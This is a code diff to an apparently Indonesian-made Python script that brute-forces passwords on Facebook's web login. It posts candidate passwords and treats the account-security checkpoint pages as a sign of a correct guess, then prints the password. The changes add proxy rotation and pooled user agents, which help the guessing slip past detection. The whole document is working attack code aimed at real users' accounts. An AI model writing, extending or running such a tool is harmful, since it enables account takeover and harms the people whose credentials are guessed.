@@ -1,19 +1,15 @@
 import requests, sys, time, random, re
 from bs4 import BeautifulSoup
+from src.constant import proxies, user_agents
 
 class Facebook():
 
     url = 'https://web.facebook.com/login.php'
     headers = {
-	    'User-Agent':random.choice([
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
-        ]),
+	    'User-Agent':random.choice(user_agents),
     }
     payload = {}
     cookies = {}
-    typeExec = ''
     account = {
         'email': '',
         'password': ''
@@ -31,7 +27,7 @@ class Facebook():
         self.cookies = {
             'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'
         }
-        data = requests.get(self.url, headers = self.headers)
+        data = requests.get(self.url, headers = self.headers, proxies=proxies)
         # 200
         if data.status_code == 200:
             for i in data.cookies:
@@ -50,7 +46,6 @@ class Facebook():
         self.payload['pass']    = password
 
         response = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
-
         if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in response.text or 'Recent activity might affect the security of your account' in response.text or 'Harap Konfirmasikan Identitas Anda' in response.text:
             print((f'Password is {password}'), end="\r")
             sys.exit()
